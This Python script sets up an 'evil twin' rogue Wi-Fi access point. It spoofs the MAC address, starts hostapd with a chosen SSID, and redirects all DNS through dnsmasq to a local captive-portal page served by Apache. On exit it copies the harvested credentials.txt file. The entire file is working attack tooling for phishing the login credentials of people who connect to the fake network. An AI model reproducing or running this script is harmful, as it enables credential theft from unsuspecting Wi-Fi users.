# !/bin/python 3.9.7
#
# hostapd 2.9
# dnsmasq 2.85 
# aircrack-ng  
# apache2
# macchanger

#Ubuntu 21.10   Tested - OK
#KALI 2022.1    Tested - OK


from operator import index
import os
from evilconfig import *

hostapdCONF ="\
interface=" + wInt + "\n\
driver=nl80211\n\
ssid=" + wSsid +"\n\
channel=" + wCh + "\n"

dnsmasqCONF = "\
interface=" + wInt + "\n\
domain-needed\n\
no-poll\n\
bogus-priv\n\
dhcp-range=10.0.0.10,10.0.0.250,12h\n\
dhcp-option=3,10.0.0.1\n\
dhcp-option=6,10.0.0.1\n\
no-resolv\n\
listen-address=127.0.0.1\n\
server=8.8.8.8\n\
port = 53\n\
address=/#/10.0.0.1\n\
address=/www.google.com/10.0.0.1\n\
"


class EvilTwin:

    def __init__(self,inter):

        self.inter = inter
        print ("\n>>> Change MAC address")
        os.system('macchanger -a ' + self.inter + ' > /dev/null 2>&1')
        
        print (">>> restart-apache2")
        os.system('service apache2 stop > /dev/null 2>&1')
        os.system('service apache2 start > /dev/null 2>&1')

        print (">>> Enabling Monitor Mode")
        os.system('airmon-ng check kill > /dev/null 2>&1')
        os.system('ifconfig ' + self.inter + ' down > /dev/null 2>&1')
        os.system('iwconfig ' + self.inter + ' mode monitor > /dev/null 2>&1')
        os.system('ifconfig ' + self.inter + ' up > /dev/null 2>&1')
        
        print (">>> Setting interface ip")
        os.system('ip addr add 10.0.0.1/24 dev ' + self.inter + '> /dev/null 2>&1')

        print (">>> Enableing NAT")
        os.system('iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE > /dev/null 2>&1')
        os.system('iptables -A FORWARD -m conntrack --ctstate RELATED,ESTABLISHED -j ACCEPT > /dev/null 2>&1')
        os.system('iptables -A FORWARD -i ' + self.inter + ' -o eth0 -j ACCEPT > /dev/null 2>&1')
        os.system('sysctl -w net.ipv4.ip_forward=1 > /dev/null 2>&1')

        print (">>> Killing systemd-resolved")
        os.system('systemctl stop systemd-resolved > /dev/null 2>&1')

        print (">>> Killing dnsmasq")
        os.system('killall dnsmasq > /dev/null 2>&1')

        print (">>> Starting dnsmasq")
        os.system('dnsmasq -C conf/dnsmasq.conf > /dev/null 2>&1')

        print (">>> Killing hostapd")
        os.system('killall hostapd > /dev/null 2>&1')

        print (">>> Starting hostapd")
        os.system('hostapd conf/hostapd.conf & > /dev/null 2>&1')

        input ('\n\nPremere un INVIO per uscire...\n\n\n')
        
        print ("restore system....\n")

        # salva i dati direttamente
        os.system('cp /var/www/html/captive/credentials.txt credentials.txt')

        os.system('systemctl start systemd-resolved > /dev/null 2>&1')
        os.system('service NetworkManager start > /dev/null 2>&1')
        os.system('killall hostapd > /dev/null 2>&1')
        os.system('rm /etc/resolv.conf > /dev/null 2>&1')
        os.system('cp /etc/resolv.conf_backup /etc/resolv.conf > /dev/null 2>&1')
        os.system('cp -r /tmp/html /var/www/ > /dev/null 2>&1')
        os.system('chown -R www-data:www-data /var/www/html/ > /dev/null 2>&1')
        os.system('rm -r conf > /dev/null 2>&1')

def configF():
    os.system('mkdir conf > /dev/null 2>&1')
    with open("conf/hostapd.conf",'w') as f:
            f.write(hostapdCONF)
        
    with open("conf/dnsmasq.conf",'w') as f:
            f.write(dnsmasqCONF)

def configB():
    os.system('cp /etc/resolv.conf /etc/resolv.conf_backup > /dev/null 2>&1')
    os.system('cp -r /var/www/html/ /tmp/html/ > /dev/null 2>&1')
    os.system('rm -r /var/www/html/* > /dev/null 2>&1')
    os.system('cp -r html/ /var/www/ > /dev/null 2>&1')
    os.system('chown -R www-data:www-data /var/www/html/ > /dev/null 2>&1')


if(__name__ == "__main__"):

    configF()
    configB()
    x = EvilTwin(wInt)
    os.system('killall python')